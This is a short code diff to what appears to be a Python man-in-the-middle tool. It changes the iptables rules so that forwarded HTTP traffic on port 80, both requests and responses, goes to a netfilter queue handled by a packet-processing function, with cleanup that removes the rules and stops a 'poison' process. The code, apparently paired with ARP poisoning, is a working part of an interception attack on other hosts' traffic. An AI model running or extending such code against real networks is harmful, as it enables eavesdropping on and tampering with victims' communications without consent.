@@ -129,13 +129,17 @@ if __name__ == "__main__":
 
         queue = NFQ()
 
-        subprocess.run(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "5"], check=True)
+        # Intercept HTTP requests (going to port 80)
+        subprocess.run(["iptables", "-I", "FORWARD", "-p", "tcp", "--dport", "80", "-j", "NFQUEUE", "--queue-num", "5"], check=True)
+        # Intercept HTTP responses (coming from port 80)
+        subprocess.run(["iptables", "-I", "FORWARD", "-p", "tcp", "--sport", "80", "-j", "NFQUEUE", "--queue-num", "5"], check=True)
         queue.bind(5, process_packet)
         queue.run()
     except KeyboardInterrupt:
         print("Exiting...")
     finally:
-        subprocess.run(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", "5"], check=False)
+        subprocess.run(["iptables", "-D", "FORWARD", "-p", "tcp", "--dport", "80", "-j", "NFQUEUE", "--queue-num", "5"], check=False)
+        subprocess.run(["iptables", "-D", "FORWARD", "-p", "tcp", "--sport", "80", "-j", "NFQUEUE", "--queue-num", "5"], check=False)
 
         if poison_process.is_alive():
             poison_process.terminate()
